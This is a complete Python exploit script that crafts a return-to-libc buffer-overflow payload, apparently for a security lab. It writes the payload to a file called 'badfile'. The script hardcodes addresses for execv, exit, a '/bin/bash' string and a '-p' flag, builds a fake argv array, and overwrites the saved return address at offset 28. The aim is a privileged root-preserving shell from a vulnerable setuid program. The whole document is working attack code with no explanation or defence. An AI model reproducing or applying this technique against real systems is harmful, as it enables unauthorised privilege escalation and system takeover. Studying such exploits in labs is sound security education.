#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

# Addresses we found
execv_addr = 0xf7e994b0
exit_addr = 0xf7e04f80
bash_addr = 0xffffde71
arg_addr = 0xffffde0c
input_addr = 0xffffcdd0

# Construct argv[] array at offset 100 in input buffer
# argv[0] = address of "/bin/bash"
# argv[1] = address of "-p"  
# argv[2] = NULL (0x00000000)

argv_offset = 100
content[argv_offset:argv_offset+4] = (bash_addr).to_bytes(4, byteorder='little')
content[argv_offset+4:argv_offset+8] = (arg_addr).to_bytes(4, byteorder='little')
content[argv_offset+8:argv_offset+12] = (0).to_bytes(4, byteorder='little')

# Calculate address of argv array
argv_addr = input_addr + argv_offset

# Overwrite return address with execv()
Y = 28
content[Y:Y+4] = (execv_addr).to_bytes(4, byteorder='little')

# Exit address (where execv returns to)
Z = 32
content[Z:Z+4] = (exit_addr).to_bytes(4, byteorder='little')

# First argument to execv: pathname ("/bin/bash")
X1 = 36
content[X1:X1+4] = (bash_addr).to_bytes(4, byteorder='little')

# Second argument to execv: argv array address
X2 = 40
content[X2:X2+4] = (argv_addr).to_bytes(4, byteorder='little')

# Save content to a file
with open("badfile", "wb") as f:
    f.write(content)

print(f"execv address: {hex(execv_addr)}")
print(f"/bin/bash address: {hex(bash_addr)}")
print(f"-p address: {hex(arg_addr)}")
print(f"argv array address: {hex(argv_addr)}")
